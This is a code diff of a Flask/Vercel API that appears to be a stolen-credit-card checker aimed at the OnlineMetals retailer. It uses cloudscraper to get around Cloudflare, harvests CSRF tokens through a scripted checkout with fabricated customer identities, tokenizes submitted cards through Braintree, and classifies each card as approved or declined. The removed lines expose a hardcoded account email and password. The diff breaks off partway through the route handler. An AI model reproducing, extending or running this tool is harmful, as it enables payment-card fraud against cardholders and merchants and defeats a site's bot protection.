@@ -1,343 +1,438 @@
 """
-OnlineMetals card checker — Flask/Vercel API (headers complete)
-GET /api/check?cc=4111111111111111|12|26|123
+OnlineMetals B3 Auth — Flask/Vercel API
+Mirrors working local chain: cloudscraper + full CSRFToken walk.
+GET /api/check?cc=cc|mm|yy|cvc
 """
 
 from flask import Flask, request, jsonify
-import requests
-import re
-import json
-import base64
-import random
-import time
-import os
-from requests import Session
+import re, os, json, time, base64, random
+import cloudscraper
+import requests as std_requests
 
 app = Flask(__name__)
 
-TARGET      = "https://www.onlinemetals.com"
-API_VERSION = "1.0.0"
-UA          = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
-               "(KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36")
+UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+BASE = "https://www.onlinemetals.com"
 
-LGN_EMAIL = "opdevildragon@gmail.com"
-LGN_PASS  = "NsN8y"
+def vessali_random():
+    return str(random.randint(1000000000, 9999999999))
 
-# ── headers per hop (grafted from working set) ───────────────────
-H_INDEX = {
-    'User-Agent': UA,
-    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    'Accept-Encoding': "identity",
-    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
-    'sec-ch-ua-mobile': "?1",
-    'sec-ch-ua-platform': "\"Android\"",
-    'upgrade-insecure-requests': "1",
-    'sec-fetch-site': "none",
-    'sec-fetch-mode': "navigate",
-    'sec-fetch-user': "?1",
-    'sec-fetch-dest': "document",
-    'accept-language': "en-IN,en;q=0.9",
-}
+def gmail():
+    return f"vessali{vessali_random()}@gmail.com"
 
-H_LOGIN_GET = {
-    'User-Agent': UA,
-    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    'Accept-Encoding': "identity",
-    'upgrade-insecure-requests': "1",
-    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
-    'sec-ch-ua-mobile': "?1",
-    'sec-ch-ua-platform': "\"Android\"",
-    'sec-fetch-site': "same-origin",
-    'sec-fetch-mode': "navigate",
-    'sec-fetch-user': "?1",
-    'sec-fetch-dest': "document",
-    'referer': f"{TARGET}/",
-    'accept-language': "en-IN,en;q=0.9",
-    'priority': "u=0, i",
-}
+def ext(pat, text, default=None):
+    m = re.search(pat, text)
+    return m.group(1) if m else default
 
-H_LOGIN_POST = {
-    'User-Agent': UA,
-    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    'Content-Type': "application/x-www-form-urlencoded",
-    'cache-control': "max-age=0",
-    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
-    'sec-ch-ua-mobile': "?1",
-    'sec-ch-ua-platform': "\"Android\"",
-    'upgrade-insecure-requests': "1",
-    'origin': TARGET,
-    'sec-fetch-site': "same-origin",
-    'sec-fetch-mode': "navigate",
-    'sec-fetch-user': "?1",
-    'sec-fetch-dest': "document",
-    'referer': f"{TARGET}/account/login",
-    'accept-language': "en-IN,en;q=0.9",
-    'priority': "u=0, i",
-    'Accept-Encoding': "identity",
-}
-
-H_TOKEN_GET = {
-    'User-Agent': UA,
-    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    'Accept-Encoding': "identity",
-    'upgrade-insecure-requests': "1",
-    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
-    'sec-ch-ua-mobile': "?1",
-    'sec-ch-ua-platform': "\"Android\"",
-    'sec-fetch-site': "same-origin",
-    'sec-fetch-mode': "navigate",
-    'sec-fetch-user': "?1",
-    'sec-fetch-dest': "document",
-    'referer': f"{TARGET}/account",
-    'accept-language': "en-IN,en;q=0.9",
-    'priority': "u=0, i",
-}
-
-H_TOKEN_AJAX = {
-    'User-Agent': UA,
-    'sec-ch-ua-platform': "\"Android\"",
-    'x-requested-with': "XMLHttpRequest",
-    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
-    'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
-    'sec-ch-ua-mobile': "?1",
-    'origin': TARGET,
-    'sec-fetch-site': "same-origin",
-    'sec-fetch-mode': "cors",
-    'sec-fetch-dest': "empty",
-    'referer': f"{TARGET}/account/payment-methods",
-    'accept-language': "en-IN,en;q=0.9",
-    'priority': "u=1, i",
-    'Accept-Encoding': "identity",
-}
-
-H_BT = {
-    'User-Agent': UA,
-    'Content-Type': "application/json",
-    'Braintree-Version': "2018-05-10",
-    'Origin': "https://assets.braintreegateway.com",
-    'Referer': "https://assets.braintreegateway.com/",
-    'Sec-Fetch-Site': "cross-site",
-    'Sec-Fetch-Mode': "cors",
-    'Sec-Fetch-Dest': "empty",
-    'Accept-Language': "en-IN,en;q=0.9",
-    'priority': "u=1, i",
-    'Accept-Encoding': "identity",
-}
-
-H_CHECKOUT_GET = {
-    'User-Agent': UA,
-    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    'Accept-Encoding': "identity",
-    'upgrade-insecure-requests': "1",
-    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
-    'sec-ch-ua-mobile': "?1",
-    'sec-ch-ua-platform': "\"Android\"",
-    'sec-fetch-site': "same-origin",
-    'sec-fetch-mode': "navigate",
-    'sec-fetch-user': "?1",
-    'sec-fetch-dest': "document",
-    'referer': f"{TARGET}/cart",
-    'accept-language': "en-IN,en;q=0.9",
-    'priority': "u=0, i",
-}
-
-H_CHECKOUT_POST = {
-    'User-Agent': UA,
-    'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    'Content-Type': "application/x-www-form-urlencoded",
-    'cache-control': "max-age=0",
-    'sec-ch-ua': "\"Chromium\";v=\"154\", \"Google Chrome\";v=\"154\", \"Not A(Brand\";v=\"99\"",
-    'sec-ch-ua-mobile': "?1",
-    'sec-ch-ua-platform': "\"Android\"",
-    'upgrade-insecure-requests': "1",
-    'origin': TARGET,
-    'sec-fetch-site': "same-origin",
-    'sec-fetch-mode': "navigate",
-    'sec-fetch-user': "?1",
-    'sec-fetch-dest': "document",
-    'referer': f"{TARGET}/checkout",
-    'accept-language': "en-IN,en;q=0.9",
-    'priority': "u=0, i",
-    'Accept-Encoding': "identity",
-}
-
-# ── scrub urls/domains from any message ─────────────────────────
 def scrub(msg: str) -> str:
     if not msg:
         return ""
     msg = re.sub(r'https?://\S+', '[redacted]', msg)
-    msg = re.sub(r'\b(?:\w+\.)+(?:com|net|org|io|au|co|php)\b', '[redacted]', msg)
     return msg.strip()
 
-# ── extract braintree auth ─────────────────────────────────────
-def extract_auth(html: str):
-    if not html:
-        return None
-    m = re.search(r'braintree\.dropin\.create\(\s*(\{.*?\})\s*\)', html, re.DOTALL)
-    if m:
+def make_scraper():
+    s = cloudscraper.create_scraper(
+        browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
+    )
+    return s
+
+def check_card(line):
+    p = line.strip().split("|")
+    if len(p) != 4:
+        return line, "BadFormat", "need cc|mm|yy|cvc"
+    cc, mm, yy, cvc = p
+    scraper = make_scraper()
+    email = gmail()
+
+    # ── 1. index product page, grab csrf + page uuid ────────────
+    r = scraper.get(f"{BASE}/en/buy/hex-bar", headers={
+        'User-Agent': UA,
+        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        'cache-control': "max-age=0",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'sec-ch-ua-platform': "\"Windows\"",
+        'upgrade-insecure-requests': "1",
+        'sec-fetch-site': "none",
+        'sec-fetch-mode': "navigate",
+        'sec-fetch-user': "?1",
+        'sec-fetch-dest': "document",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=0, i",
+    }, timeout=30)
+    csrf = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
+    result = ext(r'smartedit-page-uuid-([A-Za-z0-9+/=]+)', r.text)
+    if not csrf or not result:
+        return line, "CloudflareBlocked", f"http={r.status_code} len={len(r.text)}"
+
+    # ── 2. add to cart ──────────────────────────────────────────
+    scraper.post(f"{BASE}/en/tkaddtocart/add", headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/buy/hex-bar",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, data={
+        'CSRFToken': csrf,
+        'isHeatRequried': "false",
+        'enableStockCheckForPages': "true",
+        'isMarketplaceProduct': "false",
+        'moreSeller': "false",
+        'productCodePost': "1306_12_0",
+        'baseProduct': "1306",
+        'dealsBaseMsg': "",
+        'pieceQtyDiscount': "",
+        'qty': "1",
+        'offerCode': "",
+        'productCode': "1306",
+        'eventSource': f"page-productGrid+pageType-CategoryPage+template-pages-addon--thyssenkruppnastorefrontaddon-pages-product-productListPage+smartedit-page-uid-productGrid+smartedit-page-uuid-{result}+smartedit-catalog-version-uuid-olmContentCatalog/Online+language-en+sticky-header",
+        'popUpText': "Unknown",
+        'buyBoxWinner': "true",
+        'is3pCompeteProduct': "false",
+    }, timeout=30)
+
+    # ── 3. cart page, grab csrf1 ────────────────────────────────
+    r = scraper.get(f"{BASE}/en/cart",
+        params={'eventSource': f"page-productGrid pageType-CategoryPage template-pages-addon--thyssenkruppnastorefrontaddon-pages-product-productListPage smartedit-page-uid-productGrid smartedit-page-uuid-{result} smartedit-catalog-version-uuid-olmContentCatalog/Online language-en sticky-header"},
+        headers={
+        'User-Agent': UA,
+        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'sec-ch-ua-platform': "\"Windows\"",
+        'upgrade-insecure-requests': "1",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "navigate",
+        'sec-fetch-user': "?1",
+        'sec-fetch-dest': "document",
+        'referer': "https://www.onlinemetals.com/en/buy/hex-bar",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=0, i",
+    }, timeout=30)
+    csrf1 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
+    if not csrf1:
+        return line, "Declined", f"stage2 no csrf1 http={r.status_code}"
+
+    # ── 4. loyalty + page-visited ───────────────────────────────
+    scraper.get(f"{BASE}/emarsys/loyalty/generateToken", headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/cart",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, timeout=30)
+
+    scraper.post(f"{BASE}/en/cart/update-page-visited", headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/cart",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, data={'CSRFToken': csrf1, 'pageType': "cart"}, timeout=30)
+
+    # ── 5. walk checkout pages, collect csrf2 ───────────────────
+    for u in ["/en/checkout", "/en/checkout/multi",
+              "/en/checkout/multi/delivery-address/add-address"]:
+        r = scraper.get(BASE + u, headers={
+            'User-Agent': UA,
+            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            'upgrade-insecure-requests': "1",
+            'sec-fetch-site': "same-origin",
+            'sec-fetch-mode': "navigate",
+            'sec-fetch-user': "?1",
+            'sec-fetch-dest': "document",
+            'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+            'sec-ch-ua-mobile': "?0",
+            'sec-ch-ua-platform': "\"Windows\"",
+            'referer': "https://www.onlinemetals.com/en/cart",
+            'accept-language': "en-US,en;q=0.9",
+            'priority': "u=0, i",
+        }, timeout=30)
+    csrf2 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
+    if not csrf2:
+        return line, "Declined", f"stage3 no csrf2 http={r.status_code}"
+
+    # ── 6. preferences + address validation + address ───────────
+    scraper.post(f"{BASE}/en/checkout/update-preferences",
+        params={'CSRFToken': csrf2},
+        headers={
+        'User-Agent': UA,
+        'Content-Type': "application/json",
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-address/add-address",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, data=json.dumps({"enableRegistration": True,
+                        "enrollInEmarsysLoyalty": False,
+                        "emailOptInToNewsAndOffers": True}), timeout=30)
+
+    r = scraper.post(f"{BASE}/en/checkout/multi/delivery-address/add-address-validation",
+        headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-address/add-address",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, data={
+        'CSRFToken': csrf2, 'shippingAddress': "true", 'emailCoupon': "false",
+        'firstName': "Vessa", 'lastName': "Liuis", 'email': email,
+        'companyName': "None", 'line1': "123+Allen+Street", 'line2': "",
+        'townCity': "New+York", 'regionIso': "US-NY", 'postcode': "10001",
+        'countryIso': "US", 'phone': "2012455464", 'ext': "", 'fax': "",
+    }, timeout=30)
+    csrf3 = ext(r'name="CSRFToken" value="([^"]+)"', r.text) or csrf2
+
+    r = scraper.post(f"{BASE}/en/checkout/multi/delivery-address/add-address",
+        headers={
+        'User-Agent': UA,
+        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+        'cache-control': "max-age=0",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'sec-ch-ua-platform': "\"Windows\"",
+        'upgrade-insecure-requests': "1",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "navigate",
+        'sec-fetch-user': "?1",
+        'sec-fetch-dest': "document",
+        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-address/add-address",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=0, i",
+    }, data={
+        'shippingAddress': "true", 'emailCoupon': "false", 'CSRFToken': csrf3,
+        'firstName': "Vessa", 'lastName': "Liuis", 'email': email,
+        'companyName': "None", 'line1': "123+ALLEN+ST", 'line2': "",
+        'townCity': "NEW+YORK", 'regionIso': "US-NY", 'postcode': "10002-3024",
+        'countryIso': "US", 'phone': "2012455464", 'ext': "", 'fax': "",
+        'suggestionAddress': "on",
+    }, timeout=30)
+    csrf4 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
+    if not csrf4:
+        return line, "Declined", f"stage4 no csrf4 http={r.status_code}"
+
+    # ── 7. delivery method ──────────────────────────────────────
+    scraper.post(f"{BASE}/en/checkout/multi/delivery-method/setDeliveryMode",
+        headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-method/select-method",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, data={'CSRFToken': csrf4, 'entryNumbers': "0",
+             'selectedDeliveryMode': "WILL_CALL", 'isDirectShip': "true"}, timeout=30)
+
+    # ── 8. billing address ──────────────────────────────────────
+    r = scraper.get(f"{BASE}/en/checkout/multi/billing-address/add-address",
+        headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/checkout/multi/delivery-method/select-method",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, timeout=30)
+    csrf5 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
+    if not csrf5:
+        return line, "Declined", f"stage5 no csrf5 http={r.status_code}"
+
+    scraper.post(f"{BASE}/en/checkout/multi/billing-address/add-address",
+        headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/checkout/multi/billing-address/add-address",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, data={
+        'billingAddress': "true", 'sameAsShipping': "on", 'CSRFToken': csrf5,
+        'firstName': "", 'lastName': "", 'email': "", 'companyName': "",
+        'line1': "", 'line2': "", 'townCity': "", 'regionIso': "US-CA",
+        'postcode': "", 'countryIso': "US", 'phone': "", 'ext': "", 'fax': "",
+        'jobTitle': "select", 'businessType': "select", 'businessSize': "select"}, timeout=30)
+
+    # ── 9. payment page, grab csrf6 + paymentToken ──────────────
+    r = scraper.get(f"{BASE}/en/checkout/multi/payment-method/add-payment",
+        headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/checkout/multi/billing-address/add-address",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=1, i",
+    }, timeout=30)
+    csrf6 = ext(r'name="CSRFToken" value="([^"]+)"', r.text)
+    payment_token = ext(r'ACC\.config\.paymentToken\s*=\s*["\']([^"\']+)["\']', r.text)
+    if not csrf6 or not payment_token:
+        return line, "Declined", f"stage6 no csrf6/paymentToken http={r.status_code}"
+
+    # ── 10. decode payment token ───────────────────────────────
+    auth = ''
+    try:
+        auth = json.loads(payment_token).get('authorizationFingerprint', '')
+    except json.JSONDecodeError:
         try:
-            j = json.loads(m.group(1))
-            tok = j.get('authorization')
-            if tok:
-                dec = json.loads(base64.b64decode(tok).decode())
-                if 'authorizationFingerprint' in dec:
-                    return dec['authorizationFingerprint']
+            auth = json.loads(base64.b64decode(payment_token).decode('utf-8')).get('authorizationFingerprint', '')
         except Exception:
             pass
-    for m in re.findall(r'authorization:\s*"([^"]+)"', html):
-        try:
-            dec = json.loads(base64.b64decode(m).decode())
-            if 'authorizationFingerprint' in dec:
-                return dec['authorizationFingerprint']
-        except Exception:
-            continue
-    for blob in re.findall(r'([A-Za-z0-9+/=]{200,})', html):
-        try:
-            dec = json.loads(base64.b64decode(blob).decode())
-            if 'authorizationFingerprint' in dec:
-                return dec['authorizationFingerprint']
-        except Exception:
-            continue
-    return None
+    if not auth:
+        return line, "TokenError", f"auth empty ptok={payment_token[:80]}"
 
-# ── grab client token via site ajax ────────────────────────────
-def grab_token(s: Session):
+    # ── 11. tokenize card via braintree ────────────────────────
     try:
-        s.get(f"{TARGET}/", headers=H_INDEX, timeout=25)
-        s.get(f"{TARGET}/account/login", headers=H_LOGIN_GET, timeout=25)
-        s.post(f"{TARGET}/account/login", headers=H_LOGIN_POST,
-               data={'email': LGN_EMAIL, 'password': LGN_PASS,
-                     'action': 'login'}, timeout=25)
-
-        for path in ("/account/payment-methods", "/account", "/checkout"):
-            r = s.get(f"{TARGET}{path}", headers=H_TOKEN_GET, timeout=25)
-            # try direct html token first
-            tok = extract_auth(r.text)
-            if tok:
-                return tok
-            # try site ajax endpoint for client token
-            m = re.search(r'client_token_nonce["\s:]+"?([a-f0-9]{20,})"?', r.text)
-            if m:
-                nonce = m.group(1)
-                aj = s.post(f"{TARGET}/wp-admin/admin-ajax.php",
-                            headers=H_TOKEN_AJAX,
-                            data={'action': 'wc_braintree_credit_card_get_client_token',
-                                  'nonce': nonce}, timeout=25)
-                try:
-                    j = aj.json()
-                    if j.get('success') and j.get('data'):
-                        td = json.loads(base64.b64decode(j['data']).decode())
-                        if 'authorizationFingerprint' in td:
-                            return td['authorizationFingerprint']
-                except Exception:
-                    pass
-    except Exception:
-        pass
-    return None
-
-# ── tokenize card via braintree graphql ────────────────────────
-def tokenize(s: Session, auth: str, cc, mm, yy, cvv):
-    sid = ''.join(random.choices('abcdef0123456789', k=32))
-    payload = {
-        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": sid},
-        "query": ("mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) "
-                  "{ tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"),
-        "variables": {"input": {
-            "creditCard": {"number": cc, "expirationMonth": mm,
-                           "expirationYear": yy, "cvv": cvv},
-            "options": {"validate": False}}},
-        "operationName": "TokenizeCreditCard",
-    }
-    hdrs = dict(H_BT)
-    hdrs['Authorization'] = f'Bearer {auth}'
-    r = s.post("https://payments.braintree-api.com/graphql",
-               json=payload, headers=hdrs, timeout=25)
-    if r.status_code != 200:
-        return None, "token_api_fail"
-    j = r.json()
-    if 'errors' in j:
-        return None, scrub(str(j['errors']))
-    try:
-        return j['data']['tokenizeCreditCard']['token'], None
-    except (KeyError, TypeError):
-        return None, "bad_token_response"
-
-# ── submit nonce → classify ────────────────────────────────────
-def submit(s: Session, nonce: str):
-    try:
-        r = s.post(f"{TARGET}/checkout/complete", headers=H_CHECKOUT_POST,
-                   data={'payment_method': 'braintree_credit_card',
-                         'payment_nonce': nonce,
-                         'accept_terms': '1'}, timeout=25)
-        body = r.text.lower()
-        if any(k in body for k in ('order received', 'order confirmed',
-                                   'thank you', 'payment approved', 'success')):
-            return {'status': 'approved', 'message': 'Auth Successfully'}
-        if 'insufficient' in body:
-            return {'status': 'approved', 'message': 'Insufficient Funds'}
-        errs = re.findall(r'<li[^>]*>(.*?)</li>', r.text, re.DOTALL)
-        for e in errs:
-            txt = re.sub(r'<[^>]+>', '', e)
-            if any(k in txt.lower() for k in
-                   ('declin', 'incorrect', 'invalid', 'cvv', 'expired', 'fail')):
-                return {'status': 'declined', 'message': scrub(txt)}
-        m = re.search(r'(error|declin)[^<]*?:\s*([^<]+)', body)
-        if m:
-            return {'status': 'declined', 'message': scrub(m.group(2))}
-        return {'status': 'declined', 'message': 'Card declined'}
+        bt_json = std_requests.post("https://payments.braintree-api.com/graphql",
+            headers={
+                'User-Agent': UA,
+                'Content-Type': "application/json",
+                'sec-ch-ua-platform': "\"Windows\"",
+                'authorization': f"Bearer {auth}",
+                'braintree-version': "2018-05-10",
+                'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+                'sec-ch-ua-mobile': "?0",
+                'origin': "https://assets.braintreegateway.com",
+                'sec-fetch-site': "cross-site",
+                'sec-fetch-mode': "cors",
+                'sec-fetch-dest': "empty",
+                'referer': "https://assets.braintreegateway.com/",
+                'accept-language': "en-US,en;q=0.9",
+                'priority': "u=1, i",
+            }, timeout=30,
+            data=json.dumps({
+                "clientSdkMetadata": {"source": "client", "integration": "dropin2",
+                                      "sessionId": "59052a2b-776f-49f8-b602-6ebb19538522"},
+                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
+                "variables": {"input": {"creditCard": {
+                    "number": cc, "expirationMonth": mm, "expirationYear": yy,
+                    "cvv": cvc, "billingAddress": {"postalCode": "10001"}},
+                    "options": {"validate": False}}},
+                "operationName": "TokenizeCreditCard"})).json()
     except Exception as e:
-        return {'status': 'error', 'message': scrub(str(e))}
+        return line, "NetworkError", f"braintree: {str(e)[:150]}"
 
-# ── routes ─────────────────────────────────────────────────────
+    token = bt_json.get('data', {}).get('tokenizeCreditCard', {}).get('token', '')
+    if not token:
+        return line, "TokenError", f"bt={json.dumps(bt_json)[:400]}"
+
+    # ── 12. save-payment (final auth) ──────────────────────────
+    r = scraper.post(f"{BASE}/en/checkout/multi/payment-method/save-payment",
+        params={'CSRFToken': csrf6},
+        headers={
+        'User-Agent': UA,
+        'sec-ch-ua-platform': "\"Windows\"",
+        'x-requested-with': "XMLHttpRequest",
+        'sec-ch-ua': "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Google Chrome\";v=\"150\"",
+        'sec-ch-ua-mobile': "?0",
+        'origin': "https://www.onlinemetals.com",
+        'sec-fetch-site': "same-origin",
+        'sec-fetch-mode': "cors",
+        'sec-fetch-dest': "empty",
+        'referer': "https://www.onlinemetals.com/en/checkout/multi/payment-method/add-payment",
+        'accept-language': "en-US,en;q=0.9",
+        'priority': "u=0, i",
+    }, data={'nonce': token,
+             'deviceData': "{\"correlation_id\":\"59052a2b-776f-49f8-b602-6ebb1953\"}"}, timeout=30)
+
+    if "saved" in r.text.lower():
+        return line, "Approved", ""
+    body = r.text[:400]
+    if "2105" in body:
+        return line, "Declined_2105", body
+    return line, "Declined", f"save_http={r.status_code} body={body}"
+
+
+# ── FLASK ROUTES ───────────────────────────────────────────────
 @app.route('/', methods=['GET'])
 def home():
-    return jsonify({'status': 'active', 'gateway': 'OnlineMetals — Braintree',
-                    'version': API_VERSION,
-                    'endpoints': {'/api/check': 'GET ?cc=number|mm|yy|cvv',
-                                  '/api/health': 'GET'}})
+    return jsonify({
+        'status': 'active',
+        'gateway': 'OnlineMetals — Braintree',
+        'endpoints': {'/api/check': 'GET ?cc=number|mm|yy|cvv',
+                      '/api/health': 'GET'}
+    })
 
 @app.route('/api/health', methods=['GET'])
 def health():
     return jsonify({'status': 'healthy', 'ts': time.time()})
 
 @app.route('/api/check', methods=['GET'])
-def check():
-    s = Session()
+def api_check():
+    raw = request.args.get('cc', '').strip()
+    if not raw:
